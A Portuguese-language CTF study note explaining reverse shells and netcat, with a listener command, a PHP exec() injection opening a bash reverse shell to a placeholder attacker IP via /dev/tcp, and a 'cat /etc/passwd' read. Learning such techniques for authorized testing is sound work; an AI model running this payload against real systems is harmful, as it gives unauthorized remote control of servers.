# Shell Reverse (CTF)

O shell reverso é uma técnica para obter um terminal remoto em outro computador invertendo a direção da conexão: em vez de você se conectar ao servidor, é o servidor que se conecta ao seu computador. Isso cria um terminal remoto que permite executar comandos no servidor a partir do seu computador.

## Como funciona (resumido)
- O atacante prepara um computador para escutar conexões.  
- O computador alvo (servidor) executa um programa que abre uma conexão de saída para o computador do atacante.  
- Quando a conexão é estabelecida, o atacante passa a ter um shell (terminal) no servidor e pode executar comandos remotamente.

## Vantagem dessa abordagem
- Funciona em ambientes onde o servidor está protegido por firewall ou NAT que bloqueiam conexões de entrada e conexões de saída costumam ser permitidas.

## Limitações e riscos
- O acesso pode ser temporário: se o servidor trocar de IP, for reiniciado, ou perder a conexão, é preciso refazer o processo.  
- Firewalls, sistemas de detecção e políticas de rede podem bloquear ou detectar a conexão de saída.  
- Manter acesso por muito tempo aumenta a chance de ser detectado e bloqueado.

## Ferramentas
- Existem ferramentas simples (como o netcat) que permitem configurar um lado para escutar e outro para conectar.

## O que o atacante faz quando tem o shell
- Ele digita comandos no terminal do próprio computador; esses comandos são executados diretamente no servidor alvo — é como ter um terminal físico ligado naquele servidor.

# Netcat

É uma ferramenta que permite ler e escrever dados pela rede usando o protocolo TCP ou UDP.

## Execução do Netcat

**No nosso terminal:**
- `NC -NVLP 80`  ← listening mode na porta 80

**Na entrada da máquina alvo:**
- `echo exec("whoami");`
- `exec("/bin/bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/80 0>&1'");`
  - (exec() executa o código no terminal do sistema e retorna o resultado no nosso terminal)
- `cat /etc/passwd` → Verificar todos os usuários

---

> **Observações:**  
> - Substitua `IP_ATACANTE` pelo IP da máquina do atacante que está escutando.  
> - Dependendo da linguagem/ambiente do alvo (PHP, bash, python, etc.) a sintaxe do payload pode variar e precisar de escapes diferentes.  
> - Teste em ambiente controlado e só execute em alvos com autorização explícita.
